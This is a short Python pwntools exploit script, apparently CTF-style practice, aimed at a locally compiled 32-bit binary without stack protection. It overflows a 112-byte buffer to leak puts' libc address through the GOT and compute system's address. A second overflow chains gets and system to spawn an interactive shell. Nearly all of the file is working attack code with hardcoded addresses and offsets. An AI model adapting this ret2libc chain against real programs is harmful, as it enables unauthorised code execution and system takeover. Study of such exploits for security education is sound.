#!/usr/bin/env python
from pwn import *

'''

gcc a.c -m32 -fno-stack-protector -o a

'''

s = process('./a')

#objdump -M intel -d a
#elf = ELF('./a')
puts_plt = 0x08048370#elf.symbols['puts']
puts_got = 0x0804a014#elf.got['puts']
gets_plt = 0x08048360#elf.symbols['gets']
# ldd a
# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " system"
# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep " puts"
puts_off = 0x657e0
system_off = 0x40310

#cat /proc/<pid>/maps => 0804a000 ~ 0804b000
buf = 0x0804af00

main_addr = 0x80484b3

print s.recv()
payload = 'A'*112 + p32(puts_plt) + p32(main_addr) + p32(puts_got)
#raw_input('#')
s.send(payload + "\n")

system_addr = u32(s.recv(4)) - puts_off + system_off
print 'system is at => ' + hex(system_addr)
print s.recv()

payload2 = 'A'*112 + p32(gets_plt) + p32(system_addr) + p32(buf) + p32(buf)
s.send(payload2 + "\n")
s.interactive()
s.close()
